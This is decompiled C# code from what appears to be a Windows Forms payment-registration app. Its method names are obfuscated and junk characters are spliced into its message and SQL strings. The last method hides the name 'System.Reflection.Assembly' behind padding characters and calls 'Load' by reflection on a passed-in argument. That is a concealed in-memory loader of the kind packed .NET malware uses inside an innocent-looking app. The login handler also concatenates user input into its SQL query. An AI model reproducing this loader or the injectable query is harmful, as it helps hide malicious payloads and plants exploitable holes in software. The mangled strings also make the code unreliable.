				if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(lw20Rx_0.object_11, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(lw20Rx_0.object_12, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(lw20Rx_0.object_13, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxCardNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxBranch, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
				{
					MessageBox.Show("Pleasetrurtutrutru enter the trutrurturtywdetails");
				}
				else
				{
					((SqlCommand)((obj2 is SqlCommand) ? obj2 : null)).ExecuteNonQuery();
					Interaction.MsgBox((object)"SuccersWRVQW46N575M8sfully Regis57959,tered.", (MsgBoxStyle)64, (object)"Succr46m880.69p9.7ess");
				}
				((SqlConnection)obj).Close();
			}
			((SqlConnection)obj).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"ErrWE668769,or", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void Nq8r1D(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bb: Unknown result type (might be due to invalid IL or missing references)
		DbConnection dbConnection = (DbConnection)new SqlConnection("AET578 8Etyir77i7yi  688 87");
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(lw20Rx_0.object_11, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			MessageBox.Show("Emeurt778799,pty Id");
			return;
		}
		ICloneable cloneable = (ICloneable)new SqlCommand("Usytrutt7i76967969yit", (SqlConnection)(object)((dbConnection is SqlConnection) ? dbConnection : null));
		((SqlCommand)cloneable).get_Parameters().Add("@cndyirt7i", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(lw20Rx_0.object_12, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).get_Parameters().Add("@bnyiu5y 56", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(lw20Rx_0.object_13, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)cloneable).get_Parameters().Add("@cardnusty 5w5757m", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxCardNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).get_Parameters().Add("@bansy5547ykb", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxBranch, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)cloneable).get_Parameters().Add("@ite676d", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(lw20Rx_0.object_11, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Open();
		if (((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("Data dture68me 68u 6Upd6uated");
		}
		else
		{
			MessageBox.Show("Da 5 u6ta Ntaeot U6878eh jghlipdated");
		}
		((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Close();
	}

	private void Xz28No(object sender, EventArgs e)
	{
		Qx04Lk();
		NewLateBinding.LateCall(Admin_Hmepage, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void Qx04Lk()
	{
		throw new NotImplementedException();
	}

	private void Bm6k9P(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		object obj = (object)new SqlConnection("sdh oufuafgr9uf");
		DbCommand dbCommand = (DbCommand)new SqlCommand("DELETE FsafagargraeyreyROM payments WutyiriuooHERE PtyrtuaymentID = @id", (SqlConnection)obj);
		((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).get_Parameters().Add("@iddtuyud", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(lw20Rx_0.object_11, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)((obj is SqlConnection) ? obj : null)).Open();
		if (((SqlCommand)((dbCommand is SqlCommand) ? dbCommand : null)).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("Padyuyiuo8p98[yment 0[09[Deleted");
		}
		else
		{
			MessageBox.Show("Payme4e66798ont Deleted");
		}
		((SqlConnection)obj).Close();
	}

	private void b6RLi4(object sender, EventArgs e)
	{
		Nz32Te.x9LRn1();
	}

	private void Yd51Kk(object sender, EventArgs e)
	{
		m5ZCt7();
		NewLateBinding.LateCall(lw20Rx_0.object_2, (Type)null, "EndEdit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object tableAdapterManager = TableAdapterManager;
		object[] array = new object[1];
		ref object database1DataSet = ref Database1DataSet;
		array[0] = database1DataSet;
		Array array2 = array;
		bool[] obj = new bool[1] { true };
		Array array3 = obj;
		NewLateBinding.LateCall(tableAdapterManager, (Type)null, "UpdateAll", array, (string[])null, (Type[])null, obj, true);
		if (((bool[])array3)[0])
		{
			database1DataSet = RuntimeHelpers.GetObjectValue((array2 as object[])[0]);
		}
	}

	private void Gx54Zz(object sender, EventArgs e)
	{
		object paymentsTableAdapter = PaymentsTableAdapter;
		object[] array = new object[1];
		object object_ = lw20Rx_0.object_14;
		array[0] = NewLateBinding.LateGet(object_, (Type)null, "Payments", new object[0], (string[])null, (Type[])null, (bool[])null);
		Array array2 = array;
		bool[] obj = new bool[1] { true };
		Array array3 = obj;
		NewLateBinding.LateCall(paymentsTableAdapter, (Type)null, "Fill", array, (string[])null, (Type[])null, obj, true);
		if ((array3 as bool[])[0])
		{
			NewLateBinding.LateSetComplex(object_, (Type)null, "Payments", new object[1] { ((object[])array2)[0] }, (string[])null, (Type[])null, true, false);
		}
		object object_2 = lw20Rx_0.object_3;
		object[] array4 = new object[1];
		object_ = Database1DataSet;
		array4[0] = NewLateBinding.LateGet(object_, (Type)null, "Register", new object[0], (string[])null, (Type[])null, (bool[])null);
		array2 = array4;
		NewLateBinding.LateCall(object_2, (Type)null, "Fill", array4, (string[])null, (Type[])null, (bool[])(array3 = new bool[1] { true }), true);
		if ((array3 as bool[])[0])
		{
			NewLateBinding.LateSetComplex(object_, (Type)null, "Register", new object[1] { (array2 as object[])[0] }, (string[])null, (Type[])null, true, false);
		}
	}

	private void n1NWo6(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_0137: Unknown result type (might be due to invalid IL or missing references)
		DbConnection dbConnection = (DbConnection)new SqlConnection();
		new SqlCommand();
		((SqlConnection)dbConnection).set_ConnectionString("asfgyueyjrtyoyuipyupiuopiouppiuop");
		DbConnection dbConnection2 = null;
		ICloneable cloneable = null;
		try
		{
			dbConnection2 = (DbConnection)new SqlConnection("nb ghk y7 6iotkrkut");
			((SqlConnection)((dbConnection2 is SqlConnection) ? dbConnection2 : null)).Open();
			object obj = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"sgffgj", NewLateBinding.LateGet(lw20Rx_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' AND password ='"), NewLateBinding.LateGet(TextBoxPassword, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' "));
			cloneable = (ICloneable)new SqlCommand((string)obj, (SqlConnection)(object)((dbConnection2 is SqlConnection) ? dbConnection2 : null));
			IDisposable disposable = (IDisposable)((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).ExecuteReader();
			if (((SqlDataReader)((disposable is SqlDataReader) ? disposable : null)).Read())
			{
				MessageBox.Show("Logly");
				Qx04Lk();
				NewLateBinding.LateCall(lw20Rx_0.object_15, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
			else
			{
				MessageBox.Show("Ighj");
				NewLateBinding.LateCall(lw20Rx_0.object_16, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"MSSQL ERROR", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	internal static object p0B4Fx(object Ga0k4L, object Dr03No)
	{
		object obj = new g9M8Hp();
		IEnumerable enumerable = string.Format("{0}.{1}.{2}", "TTSTyTsTtTeTTmTT", "TTRTTTeTfTlTeTcTtTiToTTTnTT", "TTTATsTsTeTmTTTbTlTyTTT");
		((g9M8Hp)obj)._0024VB_0024Local_Splitter = "T";
		IComparable comparable = string.Format("{0}{1}{2}{3}", "l".ToUpper(), "o", "a", "d");
		Gd13P.Ass = RuntimeHelpers.GetObjectValue(Type.GetType(new string((enumerable as string).ToCharArray().Where(((g9M8Hp)obj).f6Y8To).ToArray()))!.InvokeMember(comparable as string, BindingFlags.InvokeMethod, null, null, new object[1] { Dr03No }));
		object result = default(object);
		return result;
	}
}
